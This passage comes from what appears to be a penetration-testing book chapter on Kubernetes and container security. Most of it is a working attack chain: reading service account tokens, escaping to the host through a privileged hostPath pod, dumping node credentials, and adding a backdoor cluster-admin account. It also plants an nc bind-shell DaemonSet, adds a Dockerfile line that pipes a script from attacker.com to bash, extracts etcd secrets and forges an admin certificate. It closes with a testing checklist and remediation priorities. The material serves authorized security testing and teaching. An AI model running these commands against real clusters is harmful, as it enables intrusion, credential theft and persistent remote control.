### 9.9.2 Evasion Techniques**

Understanding Falco evasion helps test detection resilience:

```bash
# Falco bypass through syscall filtering
# Run exploits using syscalls not monitored by Falco

# Timestamp manipulation to evade time-based detection
# Execute actions during maintenance windows

# Process name masquerading
# Rename malicious processes to legitimate names

# Log flooding to mask malicious activity
# Generate high volume of benign events

# Container escape via unmonitored paths
# Use namespaces or capabilities not covered by rules
```

## 9.10 Real-World Attack Chains

### 9.10.1 Complete Cluster Compromise Scenario

This section demonstrates a realistic attack chain progressing from initial access to complete cluster control:

**Phase 1: Initial Access via Exposed Dashboard**

```bash
# Discover exposed Kubernetes dashboard
# Common paths: /api/v1/namespaces/kube-system/services/https:kubernetes-dashboard:/proxy/

# Check for authentication bypass or default credentials
# Dashboard versions < 2.0 often permit anonymous access

# Access dashboard with extracted token
# Use browser developer tools to extract service account tokens
```

**Phase 2: Reconnaissance and Privilege Analysis**

```bash
# Extract service account token from compromised dashboard pod
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Configure kubectl
export TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
kubectl --token=$TOKEN --server=https://kubernetes.default.svc --certificate-authority=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt auth can-i --list

# Enumerate cluster resources
kubectl --token=$TOKEN get nodes,ns,pods,secrets,roles,clusterroles --all-namespaces
```

**Phase 3: Privilege Escalation via RBAC**

```bash
# Identify roles with pod creation permissions
kubectl --token=$TOKEN get clusterroles -o json | jq '.items[] | select(.rules[]?.verbs[]? == "create" and .rules[]?.resources[]? | contains("pods")) | .metadata.name'

# Create privileged pod for escape
cat > escalate.yaml << 'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: escalate
  namespace: kube-system
spec:
  containers:
  - name: escalate
    image: alpine:latest
    command: ["sleep", "3600"]
    securityContext:
      privileged: true
      runAsUser: 0
    volumeMounts:
    - name: host-root
      mountPath: /host
  volumes:
  - name: host-root
    hostPath:
      path: /
EOF

kubectl --token=$TOKEN apply -f escalate.yaml
```

**Phase 4: Container Escape and Host Access**

```bash
# Execute in privileged pod
kubectl --token=$TOKEN exec -it escalate -n kube-system -- /bin/sh

# Escape to host
chroot /host /bin/bash

# Access node credentials
cat /etc/kubernetes/kubelet.conf
cat /etc/kubernetes/pki/*

# Extract all node secrets
tar -czf /tmp/node-secrets.tar.gz /etc/kubernetes/
```

**Phase 5: Lateral Movement and Persistence**

```bash
# Create backdoor service account
kubectl create sa backdoor -n default
kubectl create clusterrolebinding backdoor --clusterrole=cluster-admin --serviceaccount=default:backdoor

# Extract persistent token
kubectl get secret $(kubectl get sa backdoor -o jsonpath='{.secrets[0].name}') -o jsonpath='{.data.token}' | base64 -d

# Install cryptominer or backdoor
kubectl apply -f - << 'EOF'
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: backdoor
  namespace: kube-system
spec:
  selector:
    matchLabels:
      app: backdoor
  template:
    metadata:
      labels:
        app: backdoor
    spec:
      containers:
      - name: backdoor
        image: alpine:latest
        command: ["nc", "-lk", "-p", "9999", "-e", "/bin/sh"]
        securityContext:
          privileged: true
EOF
```

### 9.10.2 Supply Chain Attack Demonstration**

```bash
# Compromise build pipeline and inject malicious code
# Access CI/CD system (Jenkins, GitLab CI, GitHub Actions)

# Modify Dockerfile to include backdoor
cat > Dockerfile << 'EOF'
FROM legitimate-base-image:latest
# Legitimate application setup
COPY app /app
# Malicious payload
RUN curl -s https://attacker.com/backdoor.sh | bash
EOF

# Push compromised image to registry
docker build -t registry.company.com/app:v1.0 .
docker push registry.company.com/app:v1.0

# Backdoor executes when pods start
# Provides reverse shell to attacker
```

### 9.10.3 etcd-Based Cluster Takeover**

```bash
# Access etcd through misconfigured network policy
# etcd often restricted to control plane only

# Extract all secrets
ectcdctl --endpoints=https://etcd:2379 --cacert=/etc/kubernetes/pki/etcd/ca.crt --cert=/etc/kubernetes/pki/etcd/server.crt --key=/etc/kubernetes/pki/etcd/server.key get /registry/secrets --prefix > secrets.txt

# Modify cluster-admin binding to add attacker user
ectcdctl get /registry/clusterrolebindings/cluster-admin -w json > binding.json
# Edit binding to add malicious subject
# Re-encode and write back

# Create new admin certificate
# Sign with Kubernetes CA
openssl req -new -newkey rsa:4096 -nodes -keyout attacker.key -out attacker.csr -subj "/CN=attacker/O=system:masters"
openssl x509 -req -in attacker.csr -CA /etc/kubernetes/pki/ca.crt -CAkey /etc/kubernetes/pki/ca.key -CAcreateserial -out attacker.crt -days 365

# Authenticate as cluster admin
kubectl --client-certificate=attacker.crt --client-key=attacker.key --certificate-authority=/etc/kubernetes/pki/ca.crt --server=https://api-server:6443 get secrets --all-namespaces
```

## 9.11 Comprehensive Testing Methodology

### 9.11.1 Pre-Engagement Planning

Container penetration testing requires specific scope definition:

1. **Cluster Boundaries**: Define which namespaces, nodes, and clusters are in scope
2. **Production Safety**: Establish rules of engagement for live environments
3. **Credential Provisioning**: Arrange for test accounts with various privilege levels
4. **Rollback Procedures**: Ensure ability to revert changes made during testing
5. **Detection Coordination**: Coordinate with security operations to avoid incident response conflicts

### 9.11.2 Testing Checklist**

Use this comprehensive checklist for container and Kubernetes security assessments:

**Docker Security**:
- [ ] Privileged container escape
- [ ] Docker socket mount exploitation
- [ ] Kernel exploit applicability
- [ ] Capability-based escapes
- [ ] Image layer secret extraction
- [ ] Container breakout via volume mounts
- [ ] Dockerfile security review
- [ ] Base image vulnerability assessment

**Kubernetes API Security**:
- [ ] Anonymous API access
- [ ] Service account token abuse
- [ ] RBAC privilege escalation paths
- [ ] Role/ClusterRole creation exploitation
- [ ] Secret enumeration and extraction
- [ ] ConfigMap credential exposure
- [ ] Network policy bypass
- [ ] Pod security standard violations

**Infrastructure Security**:
- [ ] etcd unauthorized access
- [ ] Kubelet API exploitation
- [ ] Dashboard exposure and abuse
- [ ] Control plane component exposure
- [ ] Node-level compromise paths
- [ ] Supply chain integrity verification
- [ ] Runtime security monitoring evasion

### 9.11.3 Reporting and Remediation**

Effective container security reports include:

1. **Attack Path Visualization**: Document complete chains from initial access to compromise
2. **Impact Assessment**: Quantify business impact of each finding
3. **Remediation Priority**: Prioritize by exploitability and impact
4. **Defense Recommendations**: Provide specific configuration changes and hardening guidance
5. **Detection Opportunities**: Suggest Falco rules or monitoring improvements

Remediation priorities for container environments:

- **Critical**: etcd exposure, anonymous API access, privileged containers in production
- **High**: Weak RBAC configurations, secret access without need, missing network policies
- **Medium**: Base image vulnerabilities, missing resource limits, insufficient logging
- **Low**: Information disclosure, version disclosure, missing labels/annotations

## 9.12 Conclusion

Container and Kubernetes security testing requires a specialized skillset bridging Linux security, cloud-native architecture, and application security. The ephemeral, distributed nature of containerized environments creates unique challenges but also opportunities for systematic security assessment.

Key principles for effective container penetration testing:

1. **Understand the Stack**: Deep knowledge of container internals, Kubernetes architecture, and cloud-native patterns enables effective testing
2. **Think in Graphs**: Kubernetes permissions and network connectivity form complex graphs; analyze paths through these graphs
3. **Assume Breach**: Test detection and response capabilities, not just prevention controls
4. **Supply Chain Focus**: Container security extends from developer workstation to production runtime
5. **Automation**: Container environments change rapidly; automated testing and continuous validation are essential

As container adoption continues to accelerate, security testing methodologies must evolve to address emerging patterns like GitOps, service meshes, and serverless containers. The fundamental principles—least privilege, defense in depth, and zero trust—remain essential, but their application in container contexts requires specialized expertise and continuous learning.

The techniques presented in this chapter provide a foundation for comprehensive container security assessment. Practitioners should combine these technical approaches with thorough understanding of organizational context, risk tolerance, and business requirements to deliver security assessments that meaningfully improve container security posture.
